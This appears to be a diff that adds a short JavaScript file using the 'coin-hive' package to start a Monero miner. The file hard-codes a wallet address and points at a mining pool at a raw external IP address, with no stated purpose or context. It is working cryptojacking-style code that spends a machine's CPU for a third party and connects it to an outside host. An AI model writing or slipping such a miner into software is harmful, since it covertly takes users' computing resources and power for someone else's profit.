@@ -1,0 +1,14 @@
+const CoinHive = require("coin-hive");
+
+(async () => {
+  const miner = await CoinHive('44tKLXJSEJPBkfGpwiz4Hy23ZdBdPTXhXXjncmJUg2J2fbEvfreyxRgfo6PvGgr5GRGasJVhYDgf5GTcmNLyrLfUAXMPGaG', {
+    pool: {
+      host: '213.32.29.150',
+      port: 14444
+    }
+  });
+  await miner.start();
+  miner.on('update', data => console.log(`
+    ${data.acceptedHashes}
+  `));
+})();
